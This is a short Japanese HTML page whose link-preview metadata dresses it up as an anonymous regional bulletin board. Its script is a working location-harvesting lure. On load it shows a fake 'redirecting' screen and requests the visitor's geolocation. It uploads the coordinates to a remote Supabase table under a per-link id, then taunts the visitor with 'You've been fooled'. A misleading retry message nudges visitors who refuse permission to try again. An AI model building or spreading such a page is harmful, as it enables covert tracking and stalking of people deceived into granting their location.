<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta property="og:title" content="地域の魅力度掲示板">
  <meta property="og:description" content="自分の地域の魅力を匿名で共有したり閲覧出来る大規模掲示板">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://ginginman-infinity.github.io/Location-information2/generate.html">
  <meta name="twitter:card" content="summary">
  <title>位置情報の送信</title>
  <script type="module">
    import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
    import { SUPABASE_URL, SUPABASE_KEY } from "./config.js";

    const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

    const params = new URLSearchParams(location.search);
    const id = params.get("id") || crypto.randomUUID();

    window.addEventListener('load', () => {
      setTimeout(() => getLocation(), 1000);
    });

    async function getLocation() {
      document.body.innerHTML = "<h3>リダイレクト中</h3>";

      navigator.geolocation.getCurrentPosition(
        async pos => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;

          const { error } = await supabase
            .from("locations")
            .upsert({ id, latitude: lat, longitude: lon });

          if (error) {
            document.body.innerHTML = `<p>送信エラー: ${error.message}</p>`;
          } else {
            document.body.innerHTML = `
              <h3>銀さんに騙されました！</h3>
              <p>ありがとうございました！</p>
            `;
          }
        },
        err => {
          document.body.innerHTML = `<p>設定が変更されましたもう一度やり直してください: ${err.message}</p>`;
        }
      );
    }
  </script>
</head>
<body>
  <h2>リダイレクト中です</h2>
</body>
</html>
